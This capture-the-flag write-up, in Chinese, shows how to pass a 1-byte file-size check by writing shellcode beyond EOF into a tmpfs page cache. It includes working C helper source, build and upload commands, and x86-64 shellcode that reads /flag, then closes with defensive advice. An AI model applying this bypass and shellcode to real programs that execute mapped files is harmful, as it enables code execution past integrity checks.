# 壹...壹字节？

## 题目简述

题目给出一个 10 秒的隔离 shell。结束后，父进程只接受 `/chall_env/shellcode` 是大小恰好 1 字节的普通文件，把它以一整页 `PROT_READ | PROT_EXEC`、`MAP_SHARED` 映射后直接跳转执行。目标是在文件大小仍为 1 的情况下，让映射页中出现完整 shellcode。

## 解题过程

### 利用文件尾部的部分页

内存页通常是 4096 字节。映射一个只有 1 字节的文件时，内核会把该文件所在页的剩余部分补零。Linux 对文件末尾部分页还有一个关键行为：如果通过共享映射写入 EOF 之后、同一页之内的区域，文件长度不会增长，数据也不会写回文件本体，但它可能继续留在页缓存中。题目目录位于 tmpfs，这些尾页脏数据不会被普通 `msync` 清掉。

于是分成两步：

1. 创建一个内容只有 `0x90` 的 1 字节文件，保证入口是 x86 NOP；
2. 另一个进程把该文件按一页读写映射，从偏移 1 开始拷入真正 shellcode。

父进程随后 `stat` 时仍看到文件大小为 1，但重新映射同一 tmpfs 页时会看到页缓存中的 `NOP || shellcode`。

### 编写填充辅助程序

辅助程序打开目标文件和载荷文件，把目标映射为一页，然后从第二个字节开始写：

```c
#include <fcntl.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>

int main(int argc, char **argv) {
    int target = open(argv[1], O_RDWR);
    int payload = open(argv[2], O_RDONLY);
    if (target < 0 || payload < 0) return 1;

    struct stat st;
    if (fstat(payload, &st) < 0) return 1;

    unsigned char *page = mmap(NULL, 0x1000,
        PROT_READ | PROT_WRITE, MAP_SHARED, target, 0);
    if (page == MAP_FAILED || st.st_size > 0xfff) return 1;

    if (read(payload, page + 1, st.st_size) != st.st_size) return 1;
    return 0;
}
```

将它静态编译，避免 chroot 中缺动态库：

```bash
musl-gcc -static -Os fill.c -o fill
strip fill
```

### 构造 shellcode 并在远端落盘

真正 shellcode 从偏移 1 开始执行，负责打开 `/flag`、读取内容并写到标准输出。逻辑可概括为：

```nasm
mov rax, 2              ; open
lea rdi, [rip + flag]
xor rsi, rsi
xor rdx, rdx
syscall

mov rdi, rax            ; read
mov rsi, rsp
mov rdx, 0x100
xor rax, rax
syscall

mov rdx, rax            ; write exact bytes read
mov rsi, rsp
mov rdi, 1
mov rax, 1
syscall
ret

flag: db "/flag", 0
```

进入题目 shell 后执行以下流程：

```bash
/busybox printf '\220' > shellcode
# 用 Base64 分块上传 fill 和 shellcode.bin
/busybox chmod 755 fill
./fill shellcode shellcode.bin
```

此时 `ls -l shellcode` 仍显示 1 字节。等待 shell 退出或 10 秒超时，父进程执行：

```c
fstat(fd, &st);                  // st_size == 1
mmap(NULL, 0x1000, PROT_READ | PROT_EXEC, MAP_SHARED, fd, 0);
((void (*)())mapping)();
```

入口先执行文件中真实存在的单字节 NOP，随后落入页缓存里的完整 payload，最终输出 flag。

## 方法总结

检查文件长度并不能保证整个映射页只有这些可信字节。文件末尾不足一页时，EOF 之后到页尾仍可能通过共享映射被污染，tmpfs 的页缓存行为尤其值得注意。防御上应只映射实际长度、把内容复制到新匿名页并显式填充，或在执行前校验整页，而不能把 1 字节 `stat` 结果等同于 1 字节可执行内容。
